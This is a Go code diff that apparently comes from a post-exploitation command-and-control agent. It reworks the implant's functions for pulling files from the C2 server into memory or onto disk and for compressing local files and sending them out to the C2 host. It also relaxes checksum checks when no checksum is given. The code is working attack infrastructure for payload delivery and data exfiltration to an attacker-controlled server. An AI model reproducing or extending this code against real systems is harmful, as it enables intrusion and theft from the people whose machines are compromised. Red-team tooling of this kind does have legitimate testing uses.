@@ -60,13 +60,9 @@ func FetchFile(config *def.Config, download_addr, file_to_download, path, checks
 // DownloadViaC2 download via EmpHTTPClient
 // if path is empty, return []data instead
 func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) (data []byte, err error) {
-	wwwPath := common.RuntimeConfig.WWWPath
-	prefix := common.RuntimeConfig.C2Prefix
-	if prefix == "" || wwwPath == "" {
-		return nil, fmt.Errorf("missing server config: Prefix=%q WWWPath=%q", prefix, wwwPath)
-	}
-	downloadURL := netutil.JoinURL(def.CCAddress, prefix, wwwPath, url.QueryEscape(config.AgentUUID)) +
-		"?file_to_download=" + url.QueryEscape(file_to_download)
+	// The download URL carries the filename as a query param for the server to serve.
+	// Routing is done via CBOR MsgAuth capability "www" — not URL path.
+	downloadURL := def.CCAddress + "?file_to_download=" + url.QueryEscape(file_to_download)
 	logging.Infof("DownloadViaCC is downloading from %s", downloadURL)
 	retData := false
 	if path == "" {
@@ -85,115 +81,56 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 		defer os.RemoveAll(lock)
 	}
 
-	// if no path specified
-	if retData {
-		logging.Infof("Downloading %s to memory", downloadURL)
-		client := def.HTTPClient
-		if client == nil {
-			err = fmt.Errorf("failed to initialize HTTP client")
-			return
-		}
-		req, err := http.NewRequest(http.MethodGet, downloadURL, nil)
-		if err != nil {
-			err = fmt.Errorf("DownloadViaCC HTTP GET failed to create request: %v", err)
-			return nil, err
-		}
-		authHeaders, authErr := buildAuthHeaders(http.MethodGet, req.URL)
-		if authErr != nil {
-			err = fmt.Errorf("DownloadViaCC build auth headers: %v", authErr)
-			return nil, err
-		}
-		req.Header = authHeaders
+	// connect to CC
+	conn, _, cancel, err := EstablishC2Connection(def.CCAddress, file_to_download, common.RuntimeConfig.C2Routes.WWW)
+	if err != nil {
+		err = fmt.Errorf("DownloadViaC2 EstablishC2Connection: %v", err)
+		return
+	}
+	defer cancel()
+	defer conn.Close()
+	secureConn := transport.NewSecureConn(conn)
 
-		resp, err := client.Do(req)
-		if err != nil {
-			err = fmt.Errorf("DownloadViaCC HTTP GET: %v", err)
-			return nil, err
-		}
-		if resp.StatusCode != 200 {
-			err = fmt.Errorf("DownloadViaCC HTTP GET: %s", resp.Status)
-			return nil, err
-		}
-		data, err := io.ReadAll(resp.Body)
+	// download to memory
+	if retData {
+		logging.Infof("Downloading %s to memory", file_to_download)
+		data, err = io.ReadAll(secureConn)
 		if err != nil {
 			err = fmt.Errorf("DownloadViaCC read body: %v", err)
 			return nil, err
 		}
-		if c := crypto.SHA256SumRaw(data); c != checksum {
+		if c := crypto.SHA256SumRaw(data); checksum != "" && c != checksum {
 			err = fmt.Errorf("DownloadViaCC checksum failed: %s != %s", c, checksum)
 			return nil, err
 		}
 		return data, nil
 	}
 
-	// use grab
-	logging.Infof("Downloading %s to %s", downloadURL, path)
-	client := grab.NewClient()
-	client.HTTPClient = def.HTTPClient
-	if client.HTTPClient == nil {
-		err = fmt.Errorf("failed to initialize HTTP client")
-		return
-	}
-
-	req, err := grab.NewRequest(path, downloadURL)
+	// download to file
+	logging.Infof("Downloading %s to %s", file_to_download, path)
+	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
 	if err != nil {
-		err = fmt.Errorf("create grab request: %v", err)
+		err = fmt.Errorf("DownloadViaC2 create file: %v", err)
 		return
 	}
-	authHeaders, authErr := buildAuthHeaders(http.MethodGet, req.HTTPRequest.URL)
-	if authErr != nil {
-		err = fmt.Errorf("DownloadViaCC build auth headers: %v", authErr)
+	defer f.Close()
+
+	_, err = io.Copy(f, secureConn)
+	if err != nil {
+		err = fmt.Errorf("DownloadViaC2 io.Copy: %v", err)
 		return
 	}
-	req.HTTPRequest.Header = authHeaders
 
-	resp := client.Do(req)
-
-	// progress
-	t := time.NewTicker(10 * time.Second)
-	defer func() {
-		t.Stop()
-		if !retData && !util.IsExist(path) {
-			data = nil
-			err = fmt.Errorf("response: %+v, target file '%s' does not exist, downloading from CC may have failed",
-				resp.HTTPResponse, path)
-		}
-
-		// encrypt the file
-		if util.IsExist(path) {
-			data, err = util.ReadFileAgent(path)
-			if err == nil {
-				util.WriteFileAgent(path, data, 0o600)
-			}
-		}
-	}()
-	for !resp.IsComplete() {
-		select {
-		case <-resp.Done:
-			err = resp.Err()
-			if err != nil {
-				err = fmt.Errorf("finished with error: %v", err)
-				logging.Print(err)
-				return
-			}
-			// checksum of the downloaded file (plaintext)
-			fileData, readErr := util.ReadFileAgent(path)
-			if readErr != nil {
-				err = fmt.Errorf("failed to read downloaded file for checksum: %v", readErr)
-				return
-			}
-			if checksum != crypto.SHA256SumRaw(fileData) {
-				err = fmt.Errorf("checksum failed: %s != %s", crypto.SHA256SumRaw(fileData), checksum)
-				return
-			}
-			logging.Infof("saved %s to %s (%d bytes)", downloadURL, path, resp.Size())
-			return
-		case <-t.C:
-			logging.Infof("%.02f%% complete", resp.Progress()*100)
+	// checksum
+	if checksum != "" {
+		c := crypto.SHA256SumFile(path)
+		if c != checksum {
+			err = fmt.Errorf("DownloadViaC2 checksum failed: %s != %s", c, checksum)
+			return nil, err
 		}
 	}
 
-	return
+	return nil, nil
 }
 
 // SendFile2CC send file to CC, with buffering
@@ -213,23 +150,19 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 	}
 	data = data[offset:]
 
-	ftpPath := common.RuntimeConfig.FTPPath
-	prefix := common.RuntimeConfig.C2Prefix
-	if prefix == "" || ftpPath == "" {
-		err = fmt.Errorf("missing server config: Prefix=%q FTPPath=%q", prefix, ftpPath)
-		return
-	}
-	url := netutil.JoinURL(def.CCAddress, prefix, ftpPath, token)
-	conn, _, _, err := EstablishC2Connection(url)
-	logging.Infof("connection: %s", url)
+	conn, _, _, err := EstablishC2Connection(def.CCAddress, token, common.RuntimeConfig.C2Routes.FTP)
+	logging.Infof("FTP connection to %s token=%s", def.CCAddress, token)
 	if err != nil {
 		err = fmt.Errorf("connection failed: %v", err)
 		return
 	}
-	defer conn.Close()
+
+	// Create a debug wrapper
+	secureConn := transport.NewSecureConn(conn)
+	defer secureConn.Close()
 
 	// open compressor
-	compressor, err := archives.Zstd{}.OpenWriter(conn)
+	compressor, err := archives.Zstd{}.OpenWriter(secureConn)
 	if err != nil {
 		err = fmt.Errorf("failed to open compressor: %v", err)
 		return
